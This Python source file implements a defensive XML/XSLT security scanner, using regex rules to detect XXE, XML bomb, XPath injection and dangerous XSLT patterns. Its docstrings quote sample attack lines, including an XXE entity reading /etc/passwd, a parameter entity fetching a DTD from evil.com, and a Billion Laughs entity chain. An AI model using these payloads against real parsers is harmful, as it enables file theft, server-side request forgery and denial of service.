"""
XML Security Scanner
Tests: XXE patterns, XPath injection, XML bomb/Billion Laughs, XSLT injection
"""

import re
from dataclasses import dataclass
from typing import List

@dataclass
class Finding:
    test_name: str
    severity: str
    file_path: str
    line_number: int
    line_content: str
    description: str


class XMLScanner:
    """Runs all XML/XSLT security tests on a single file."""

    EXTENSIONS = {".xml", ".xsl", ".xslt", ".soap", ".rss", ".atom"}

    def scan(self, file_path: str) -> List[Finding]:
        """Run all XML tests on one file."""
        try:
            with open(file_path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
        except Exception as e:
            return []

        lines = content.split("\n")
        ext = file_path.rsplit(".", 1)[-1].lower() if "." in file_path else ""
        findings = []

        findings.extend(self._test_xxe(file_path, lines, content))
        findings.extend(self._test_xml_bomb(file_path, lines, content))
        findings.extend(self._test_xpath_injection(file_path, lines, content))

        # XSLT-specific tests only on .xsl/.xslt files (or if xsl namespace detected)
        if ext in ("xsl", "xslt") or "xsl:stylesheet" in content or "xsl:transform" in content:
            findings.extend(self._test_xslt_injection(file_path, lines, content))

        return findings

    # ------------------------------------------------------------------ #
    # TEST 15: XXE (XML External Entity) Pattern Detection
    # ------------------------------------------------------------------ #
    def _test_xxe(self, fp: str, lines: list, content: str) -> List[Finding]:
        """
        Detect DOCTYPE declarations and ENTITY definitions that indicate
        possible XXE vulnerability in the parser that processed this XML.

        Patterns:
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
            <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
        """
        findings = []

        # Check for DOCTYPE with entity definitions
        has_doctype = False
        for i, line in enumerate(lines, 1):

            # DOCTYPE declaration
            if re.search(r'<!DOCTYPE\s', line, re.IGNORECASE):
                has_doctype = True

            # SYSTEM entity (external file/URL)
            if re.search(r'<!ENTITY\s+\w+\s+SYSTEM\s+[\'"]', line, re.IGNORECASE):
                url_match = re.search(
                    r'SYSTEM\s+[\'"]([^\'"]+)[\'"]', line, re.IGNORECASE
                )
                url = url_match.group(1) if url_match else "unknown"

                severity = "CRITICAL"
                desc = f"SYSTEM entity declaration: {url}"
                if url.startswith("file://"):
                    desc += " — LOCAL FILE READ"
                elif url.startswith("http"):
                    desc += " — EXTERNAL URL (SSRF vector)"
                elif url.startswith("expect://") or url.startswith("php://"):
                    desc += " — CODE EXECUTION via wrapper"

                findings.append(Finding("xxe", severity, fp, i, line.strip()[:200], desc))

            # PUBLIC entity
            if re.search(r'<!ENTITY\s+\w+\s+PUBLIC\s+', line, re.IGNORECASE):
                findings.append(Finding(
                    "xxe", "HIGH", fp, i, line.strip()[:200],
                    "PUBLIC entity declaration — potential XXE vector"
                ))

            # Parameter entity (% entity — used for out-of-band exfil)
            if re.search(r'<!ENTITY\s+%\s+\w+\s+SYSTEM', line, re.IGNORECASE):
                findings.append(Finding(
                    "xxe", "CRITICAL", fp, i, line.strip()[:200],
                    "Parameter entity (%) with SYSTEM — used for out-of-band XXE exfiltration"
                ))

            # Entity reference in content (& usage)
            if has_doctype and re.search(r'&\w+;', line):
                # Exclude standard XML entities
                custom_entities = re.findall(r'&(\w+);', line)
                standard = {'amp', 'lt', 'gt', 'quot', 'apos', 'nbsp'}
                custom = [e for e in custom_entities if e.lower() not in standard]
                if custom:
                    findings.append(Finding(
                        "xxe", "MEDIUM", fp, i, line.strip()[:200],
                        f"Custom entity reference(s): &{'&'.join(custom)}; — "
                        f"verify these are not externally defined"
                    ))

        # Check for external DTD reference
        ext_dtd = re.search(
            r'<!DOCTYPE\s+\w+\s+SYSTEM\s+[\'"]([^\'"]+)[\'"]',
            content, re.IGNORECASE
        )
        if ext_dtd:
            line_num = content[:ext_dtd.start()].count("\n") + 1
            findings.append(Finding(
                "xxe", "HIGH", fp, line_num,
                ext_dtd.group(0)[:200],
                f"External DTD reference: {ext_dtd.group(1)} — "
                f"attacker-controlled DTD can define malicious entities"
            ))

        return findings

    # ------------------------------------------------------------------ #
    # TEST 17: XML Bomb / Billion Laughs
    # ------------------------------------------------------------------ #
    def _test_xml_bomb(self, fp: str, lines: list, content: str) -> List[Finding]:
        """
        Detect nested entity definitions where entities reference other
        entities, creating exponential expansion (Billion Laughs attack).

        Pattern:
            <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;">
            <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;">
        """
        findings = []

        # Extract all entity definitions
        entity_defs = re.findall(
            r'<!ENTITY\s+(%?\s*\w+)\s+[\'"]([^\'"]*)[\'"]',
            content, re.IGNORECASE
        )

        entity_names = set()
        entities_referencing_entities = []

        for name, value in entity_defs:
            name = name.strip()
            entity_names.add(name)

            # Check if the value contains entity references
            refs_in_value = re.findall(r'&(\w+);', value)
            if refs_in_value:
                entities_referencing_entities.append((name, refs_in_value, value))

        # Flag nested entities
        for name, refs, value in entities_referencing_entities:
            # Count how many entity references are in the value
            ref_count = len(refs)
            line_num = 0
            for i, line in enumerate(lines, 1):
                if name in line and '<!ENTITY' in line.upper():
                    line_num = i
                    break

            if ref_count >= 5:
                findings.append(Finding(
                    "xml_bomb", "CRITICAL", fp, line_num,
                    f"<!ENTITY {name} references {ref_count} other entities>",
                    f"Entity '{name}' contains {ref_count} entity references — "
                    f"potential Billion Laughs / XML bomb"
                ))
            elif ref_count >= 2:
                findings.append(Finding(
                    "xml_bomb", "HIGH", fp, line_num,
                    f"<!ENTITY {name} references {ref_count} other entities>",
                    f"Entity '{name}' references other entities — review for "
                    f"exponential expansion"
                ))

        # Check total entity count
        if len(entity_defs) >= 5:
            findings.append(Finding(
                "xml_bomb", "MEDIUM", fp, 0, "",
                f"Found {len(entity_defs)} entity definitions — unusually high count, "
                f"review for XML bomb potential"
            ))

        # Check nesting depth
        if len(entities_referencing_entities) >= 3:
            # Try to detect chains: A references B, B references C
            ref_graph = {}
            for name, refs, _ in entities_referencing_entities:
                ref_graph[name] = refs

            max_depth = 0
            for start in ref_graph:
                depth = 0
                visited = set()
                queue = [start]
                while queue:
                    current = queue.pop(0)
                    if current in visited:
                        continue
                    visited.add(current)
                    depth += 1
                    if current in ref_graph:
                        queue.extend(ref_graph[current])
                max_depth = max(max_depth, depth)

            if max_depth >= 3:
                findings.append(Finding(
                    "xml_bomb", "CRITICAL", fp, 0, "",
                    f"Entity reference chain depth: {max_depth} — "
                    f"exponential expansion likely (Billion Laughs pattern)"
                ))

        return findings

    # ------------------------------------------------------------------ #
    # TEST 16: XPath Injection Indicators
    # ------------------------------------------------------------------ #
    def _test_xpath_injection(self, fp: str, lines: list, content: str) -> List[Finding]:
        """
        Detect XPath expressions that appear to concatenate variables or
        external parameters, indicating potential injection points.
        """
        findings = []

        patterns = [
            # XPath expressions with string concatenation (in XSLT)
            (r'select\s*=\s*[\'"].*concat\s*\(', "HIGH",
             "XPath select with concat() — potential injection if params are user-controlled"),
            # Dynamic XPath with variable interpolation
            (r'select\s*=\s*[\'"][^"]*\$\w+', "MEDIUM",
             "XPath expression using variable ($var) — check if variable is user-controlled"),
            # XPath predicate with string comparison (auth-like patterns)
            (r'select\s*=\s*[\'"]//\w+\[.*=\s*\$', "HIGH",
             "XPath predicate with variable comparison — classic injection pattern "
             "(e.g., //user[name=$input])"),
            # XPath in non-XSLT XML (configuration files)
            (r'xpath\s*=\s*[\'"]', "MEDIUM",
             "XPath expression in XML attribute — verify not user-injectable"),
            (r'expression\s*=\s*[\'"].*//\w+\[', "MEDIUM",
             "XPath expression with predicate — review for injection"),
        ]

        for i, line in enumerate(lines, 1):
            for pat, sev, desc in patterns:
                if re.search(pat, line, re.IGNORECASE):
                    findings.append(Finding(
                        "xpath_injection", sev, fp, i, line.strip()[:200], desc
                    ))

        return findings

    # ------------------------------------------------------------------ #
    # TEST 18: XSLT Injection
    # ------------------------------------------------------------------ #
    def _test_xslt_injection(self, fp: str, lines: list, content: str) -> List[Finding]:
        """
        Detect dangerous XSLT functions and elements that could allow
        file reading, command execution, or SSRF if the stylesheet is
        user-controllable or user-injectable.
        """
        findings = []

        dangerous_patterns = [
            # document() — reads external XML files / URLs
            (r'document\s*\(\s*[\'"](?:file://|https?://|ftp://)',
             "CRITICAL",
             "document() loading external URL — potential SSRF or file read"),
            (r'document\s*\(\s*\$',
             "HIGH",
             "document() with variable argument — potential SSRF if variable is user-controlled"),
            (r'document\s*\(',
             "MEDIUM",
             "document() function usage — verify input is not user-controllable"),

            # system-property() — leaks processor/environment info
            (r'system-property\s*\(',
             "MEDIUM",
             "system-property() — leaks XSLT processor information (vendor, version)"),

            # xsl:script / msxsl:script — arbitrary code execution
            (r'<(?:xsl|msxsl):script',
             "CRITICAL",
             "XSLT script element — allows arbitrary code execution in the processor"),

            # PHP/Java extension functions
            (r'php:function\s*\(',
             "CRITICAL",
             "php:function() in XSLT — arbitrary PHP code execution"),
            (r'php:functionString\s*\(',
             "CRITICAL",
             "php:functionString() in XSLT — arbitrary PHP code execution"),
            (r'saxon:evaluate\s*\(',
             "CRITICAL",
             "saxon:evaluate() — dynamic XPath evaluation, potential injection"),
            (r'dyn:evaluate\s*\(',
             "HIGH",
             "dyn:evaluate() — dynamic XPath evaluation"),
            (r'xalan:evaluate\s*\(',
             "HIGH",
             "xalan:evaluate() — dynamic XPath evaluation"),

            # xsl:include / xsl:import with external href
            (r'<xsl:(?:include|import)\s+href\s*=\s*[\'"]https?://',
             "HIGH",
             "XSLT including/importing stylesheet from external URL"),

            # Generating script output
            (r'<xsl:(?:text|value-of)[^>]*disable-output-escaping\s*=\s*[\'"]yes[\'"]',
             "HIGH",
             "disable-output-escaping=yes — raw output, potential XSS if generating HTML"),

            # xsl:result-document — write files (XSLT 2.0+)
            (r'<xsl:result-document',
             "HIGH",
             "xsl:result-document — can write arbitrary files on the server"),

            # Unparsed entity references
            (r'unparsed-entity-uri\s*\(',
             "MEDIUM",
             "unparsed-entity-uri() — file system access through entity resolution"),
        ]

        for i, line in enumerate(lines, 1):
            for pat, sev, desc in dangerous_patterns:
                if re.search(pat, line, re.IGNORECASE):
                    findings.append(Finding(
                        "xslt_injection", sev, fp, i, line.strip()[:200], desc
                    ))

        # Check for user-controllable parameters used in dangerous contexts
        # First collect xsl:param names
        params = re.findall(
            r'<xsl:param\s+name\s*=\s*[\'"](\w+)[\'"]',
            content, re.IGNORECASE
        )
        if params:
            for param_name in params:
                # Check if param flows into dangerous functions
                for i, line in enumerate(lines, 1):
                    if f'${param_name}' in line:
                        if any(func in line.lower() for func in
                               ['document(', 'evaluate(', 'select=', 'href=']):
                            findings.append(Finding(
                                "xslt_injection", "HIGH", fp, i,
                                line.strip()[:200],
                                f"Parameter ${param_name} used in potentially dangerous "
                                f"context — if user-controlled, enables injection"
                            ))

        return findings
